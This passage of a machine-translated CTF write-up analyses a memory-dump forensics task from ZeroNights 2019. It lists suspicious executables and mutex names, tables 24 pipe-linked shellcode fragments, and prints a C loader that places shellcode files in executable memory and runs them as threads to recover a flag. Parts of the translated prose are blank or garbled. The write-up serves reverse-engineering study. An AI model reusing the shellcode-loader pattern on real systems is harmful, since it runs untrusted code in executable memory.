zn_2019\note3.exe SIGN.MEDIA=1C89400 zn_2019\note4.exe SIGN.MEDIA=1C8A800 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C8A800 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C8A800 zn_2019\Injector2.exe SIGN.MEDIA=1C8A800 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C8A800 zn_2019\NOTE1.exe SIGN.MEDIA=1C8A800 zn_2019\With_little_debug.exe SIGN.MEDIA=1C8A800 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=1C8A800 zn_2019\injector.exe SIGN.MEDIA=1C8A800 zn_2019\nnnn.exe SIGN.MEDIA=1C8A800 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C8A800 zn_2019\note.exe SIGN.MEDIA=1C8A800 zn_2019\note2.exe SIGN.MEDIA=1C8A800 zn_2019\note3.exe SIGN.MEDIA=1C8A800 zn_2019\note4.exe SIGN.MEDIA=2D702C zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=3EDC2 zn_2019\server\a.exe SIGN.MEDIA=3EDC2 zn_2019\server\hui.exe SIGN.MEDIA=3EDC2 zn_2019\server\run.exe SIGN.MEDIA=4482C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=4482C zn_2019\PEview.exe SIGN.MEDIA=5B0058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=5B0058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=5B0058 zn_2019\Injector2.exe SIGN.MEDIA=5B0058 zn_2019\injector.exe SIGN.MEDIA=5B0058 zn_2019\note.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Discord.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Far.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\FileZillaFTPclient.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\InputDirector.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\KeePass.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\PicPick.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Skype.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\UpdateManager.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\VBoxManager.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\idaq.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\javaw.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\lunix.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\paint.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\python3.7.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\r.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\svghost.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\tsm.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\usha.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\video_xxx_kopati4_nadaval_ogurcov_kroshu.mp4.exe SIGN.MEDIA=AB82C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=AB82C zn_2019\injector.exe SIGN.MEDIA=B06D4C64 zn_2019\server\a.exe SIGN.MEDIA=B06D4C64 zn_2019\server\hui.exe SIGN.MEDIA=B06D4C64 zn_2019\server\run.exe SIGN.MEDIA=B06D4C64 zn_2019\server\video_xxx_kopati4_nadaval_ogurcov_kroshu.mp4.exe SIGN.MEDIA=BA802 zn_2019\server\run.exe SIGN.MEDIA=E00058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=E00058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=E00058 zn_2019\Injector2.exe SIGN.MEDIA=E00058 zn_2019\injector.exe SIGN.MEDIA=E00058 zn_2019\note.exe SIGN.MEDIA=E00058 zn_2019\note2.exe SIGN.MEDIA=E00058 zn_2019\note2.exe SIGN.MEDIA=E9982 zn_2019\server\run.exe</code> </pre> <br><p> I used my old tool to get filesystem structure out of NTFS records (a lot of FILE records usually cached in RAM). </p><br><p><img src="https://habrastorage.org/webt/x7/bf/tq/x7bftqu47ozkqm1ps96i6luh9za.png"><br><img src="https://habrastorage.org/webt/u9/uo/mz/u9uomzuew2uy6ib7tdqpltzozao.png"></p><br><p> <strong>data_storage</strong> is small enough to contain some resident $DATA inside FILE record, so we can extract it. </p><br><p> This file contains shellcode. All it does is resolving CreateNamedPipeA by hash using special function (see Figure below) and calling it with <strong>"\.\pipe\zn_shell_stor"</strong> argument. </p><br><p><img src="https://habrastorage.org/webt/ag/d-/9v/agd-9vmbes5yrnupfxrucg9a3cs.png"></p><br><p> I highlighted part of this function, this bytes can be used to located other 24 shellcodes inside memory dump. </p><br><p> One of shellcode #21 contained references to other, it is probably the main one. </p><br><pre> <code class="plaintext hljs">Global\vtHAjnNbCecOeNAnVeQFmdRw Global\jGzXXZJbXGPYniopljDEdwuD Global\jpBuyMNJzdnpwHimVlcBkwGo Global\ArlCJOxJFOKRkqOLcBhvjYqj Global\THxjCBohxSlNgCFbwJsHujqk Global\BOiJhsLFBuZdsFdCrLKEucpJ Global\iYxszVIFfsuzzEmGwgOQeEcb Global\NOluZoXPJalShopCCuNnWQbR Global\GCrtPmNEAOsZpSNNBdiYQfgz Global\pVVgeqcREhXSgKCwhkeyfTXw Global\trsQPehKvlxBJhEqIPtwzjxi Global\ngVrhgAEqcDssFsNerrAZsFz Global\KiZvGyiMnyTgvQdFNGcudfTY Global\FzXvKPKGCPMAERklFMXVMYga Global\nCZpFZPtyidhFOvVeemfyJAC Global\pjRmfOLLBXIbsJholoasvrqC Global\mhOVYcYRKgWdABAsgkvrcOOM Global\syGiShcLTXfQYGAAiafYBxoF Global\KbFVsPCPZrfVlUIQlvVoJLXW Global\XbuYiHCxQLTLApuToFldJIgI Global\auFqpIQAlsHcvjPEakqHyIeA Global\MrnXOMJvHmYBxRfkbLBUYWgn Global\GYVOmvrLhCpgQUPfnOshzzem Global\qaswedfrtghyujkiol121232 \\.\pipe\zn_shell_stor</code> </pre> <br><p> Every shellcode is started with CALL $+X instruction (E8 ?? ?? ?? ??), followed by data block and executable code. Code is looking for some functions and evaluates logic based on data read from pipe <strong>"\.\pipe\zn_shell_stor"</strong> . </p><br><div class="scrollable-table"><table><thead><tr><th> File </th><th> Tags </th><th> Mutex </th></tr></thead><tbody><tr><td> b1 </td><td> mov mov </td><td> Global\GCrtPmNEAOsZpSNNBdiYQfgz </td></tr><tr><td> b2 </td><td> SBOX "axfksyBLjRfMFZXdINqyTXcekgCxPRNpKtmTAj SUdmElMsuKYkmFYbJxSbXwxmvQ" </td><td> Global\NOluZoXPJalShopCCuNnWQbR </td></tr><tr><td> b3 </td><td> inc byte [rbp+0Ch] </td><td> Global\ngVrhgAEqcDssFsNerrAZsFz </td></tr><tr><td> b4 </td><td> repne scasb strlen() == 18 </td><td> Global\jpBuyMNJzdnpwHimVlcBkwGo </td></tr><tr><td> b5 </td><td> ?? </td><td> Global\ArlCJOxJFOKRkqOLcBhvjYqj </td></tr><tr><td> b6 </td><td> xor BUFFER "\x31\x2A\x72\xC8\x5E\x08\xC5\xFE \x07\x44\xCB\xEB\x76\x3B\xE1\x3A\x83" </td><td> Global\MrnXOMJvHmYBxRfkbLBUYWgn </td></tr><tr><td> b7 </td><td> ?? </td><td> Global\GYVOmvrLhCpgQUPfnOshzzem </td></tr><tr><td> b8 </td><td> cmp word [rbp+0Ch], 12h </td><td> Global\KbFVsPCPZrfVlUIQlvVoJLXW </td></tr><tr><td> b9 </td><td> ?? </td><td> Global\BOiJhsLFBuZdsFdCrLKEucpJ </td></tr><tr><td> b10 </td><td> ?? </td><td> Global\iYxszVIFfsuzzEmGwgOQeEcb </td></tr><tr><td> b11 </td><td> cmp </td><td> Global\pjRmfOLLBXIbsJholoasvrqC </td></tr><tr><td> b12 </td><td> add xor cl x2 </td><td> Global\nCZpFZPtyidhFOvVeemfyJAC </td></tr><tr><td> b13 </td><td> inc [rbp+0Ch] </td><td> Global\auFqpIQAlsHcvjPEakqHyIeA </td></tr><tr><td> b14 </td><td> dw[rbp+0Ch] = dw[rbp+0Ch] + dw[rbp+0Ch] </td><td> Global\syGiShcLTXfQYGAAiafYBxoF </td></tr><tr><td> b15 </td><td> WIN! Sleep Beep </td><td> Global\XbuYiHCxQLTLApuToFldJIgI </td></tr><tr><td> b16 </td><td> save byte </td><td> Global\mhOVYcYRKgWdABAsgkvrcOOM </td></tr><tr><td> b17 </td><td> add xor cl x2 </td><td> Global\FzXvKPKGCPMAERklFMXVMYga </td></tr><tr><td> b18 </td><td> zero rbp (0, 211h, 80h) </td><td> Global\trsQPehKvlxBJhEqIPtwzjxi </td></tr><tr><td> b19 </td><td> ?? </td><td> Global\KiZvGyiMnyTgvQdFNGcudfTY </td></tr><tr><td> b20 </td><td> Read from C:\beeps\flag.txt </td><td> Global\vtHAjnNbCecOeNAnVeQFmdRw </td></tr><tr><td> b21 </td><td> MAIN </td><td></td></tr><tr><td> b22 </td><td> Xor </td><td> Global\THxjCBohxSlNgCFbwJsHujqk </td></tr><tr><td> b23 </td><td> cmp dw[rbp+0Ch], 256 dec </td><td> Global\pVVgeqcREhXSgKCwhkeyfTXw </td></tr><tr><td> b24 </td><td> beep(1000, 1100) </td><td> Global\jGzXXZJbXGPYniopljDEdwuD </td></tr></tbody></table></div><br><p> Understanding of shellcode actions is a little bit hard because everything tied together via pipe (A calls B, B calls C and etc.). We are required to jump from one shellcode to another during reversing. </p><br><p> I decided to execute it all and see what happens. All shellcodes was saved as files <strong>bN</strong> , where N is a number in range from 1 to 24 in order of appearing in memory dump. Dump #21 is the main dispatcher (it must be loaded first). File <strong><em>C:\beeps\flag.txt</em></strong> should be present in system for #20 to work. </p><br><pre> <code class="plaintext hljs">#include &lt;windows.h&gt; void load_shellcode(int index) { FILE* fp; DWORD dwThread; int size; CHAR filename[32]; sprintf_s(filename, "b%i", index); fopen_s(&amp;fp, filename, "rb"); fseek(fp, 0, SEEK_END); size = ftell(fp); fseek(fp, 0, SEEK_SET); LPVOID pMem = VirtualAlloc( NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ); printf("Loaded %i | size=%i | at %p\n", index, size, pMem); fread(pMem, 1, size, fp); CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMem, 0, 0, &amp;dwThread); fclose(fp); } int main() { load_shellcode(21); Sleep(1000); for (int i = 1; i &lt;= 24; i++) { if (i == 21) continue; load_shellcode(i); } while (1) Sleep(1000); }</code> </pre> <br><p> I created <strong>C:\beeps\flag.txt</strong> with some dummy content (length is 17 as hinted by one of the shellcodes) and also set a breakpoint at module doing xor with buffer (#6). </p><br><p> Program executed and flag showed up in memory after XOR operation. </p><br><p> Flag: <strong><em>zn{$ucH <em>SL0W</em> !pC}</em></strong> </p></div></div><br><p>  sysenter    6 .   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="></a> . </p><br><h2>  Algumas estatísticas </h2><br><p>                .   136     . </p><br><p>       . <br>       — ASR-EHD  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Digital Security</a> .      (AV1ct0r),     22 15   . </p><br><p>     Protected Shell  RuCTFE.       — 10.   vos,     1 26. </p><br><p> ,     .   12-13    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">ZeroNights</a> . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt472416/">https://habr.com/ru/post/pt472416/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt472404/index.html">Cálculo 2D de colisão: Algoritmo de Gilbert-Johnson-Kirti</a></li>
<li><a href="../pt472406/index.html">Expandir o centro de dados durante a entrega da pizza</a></li>
<li><a href="../pt472410/index.html">Projetando sistemas de cores disponíveis</a></li>
<li><a href="../pt472412/index.html">Analista de sistemas e métricas de produto - tremer, mas não misturar?</a></li>
<li><a href="../pt472414/index.html">A longa história dos reatores rápidos de nêutrons e a promessa de um ciclo fechado de combustível</a></li>
<li><a href="../pt472418/index.html">Como manter os direitos de desenvolvimento personalizado</a></li>
<li><a href="../pt472420/index.html">Tornando a interface mais responsiva graças ao Promessa adiada</a></li>
<li><a href="../pt472422/index.html">Sber X RamblerFront & Meet Up</a></li>
<li><a href="../pt472426/index.html">Semana de Segurança 43: A Vida Secreta dos Hanipots da IoT</a></li>
<li><a href="../pt472428/index.html">Operador Tarantool kubernetes</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>